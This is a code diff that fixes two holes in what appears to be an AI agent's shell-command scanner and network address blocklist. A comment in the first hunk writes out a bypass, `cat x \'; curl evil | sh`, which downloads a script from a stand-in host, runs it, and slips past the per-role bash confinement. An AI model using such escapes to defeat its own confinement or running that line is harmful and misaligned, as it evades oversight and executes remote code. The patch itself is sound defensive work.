@@ -506,6 +506,19 @@ export function scanShellCommand(command: string): ShellScan {
       continue;
     }
 
+    // Outside any quote, a backslash escapes the next character — bash reads
+    // `\'`, `\"`, `\;`, `\|`, `\>`, `\$` as the literal character. Consume both
+    // here so the escaped char can neither open a quote nor be mistaken for a
+    // separator. Without this, `cat x \'; curl evil | sh` had its `\'` open a
+    // quote bash never opened, swallowing the whole `; curl … | sh` tail into
+    // one segment that an allow-listed `^cat` prefix then waved through — the
+    // per-role bash confinement, defeated by two characters.
+    if (ch === "\\") {
+      current += ch + (next ?? "");
+      i++;
+      continue;
+    }
+
     if (ch === '"' || ch === "'") {
       quote = ch;
       current += ch;
@@ -1442,8 +1455,21 @@ function isBlockedAddress(ip: string): boolean {
   }
   const v6 = ip.toLowerCase().replace(/^\[|\]$/g, "");
   if (v6 === "::1" || v6 === "::") return true; // loopback, unspecified
-  if (v6.startsWith("fe80")) return true; // link-local
+  if (/^fe[89ab]/.test(v6)) return true; // link-local: fe80::/10 spans fe80–febf
   if (/^f[cd]/.test(v6)) return true; // unique local
+  // NAT64 well-known prefix (64:ff9b::/96) embeds an IPv4 in the low 32 bits;
+  // decode it so a NAT64 spelling of a blocked address is blocked too.
+  const nat64 = v6.match(/^64:ff9b::(?:0:)?(.+)$/);
+  if (nat64) {
+    const tail = nat64[1];
+    const dotted = tail.match(/^\d+\.\d+\.\d+\.\d+$/);
+    if (dotted) return isBlockedAddress(tail);
+    const hex = tail.match(/^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
+    if (hex) {
+      const hi = parseInt(hex[1], 16), lo = parseInt(hex[2], 16);
+      return isBlockedAddress(`${(hi >> 8) & 0xff}.${hi & 0xff}.${(lo >> 8) & 0xff}.${lo & 0xff}`);
+    }
+  }
   // IPv4-mapped and IPv4-compatible addresses are the same destination by
   // another spelling, and both the dotted tail (::ffff:127.0.0.1) and the hex
   // tail have to be decoded — `::ffff:7f00:1` is 127.0.0.1 and
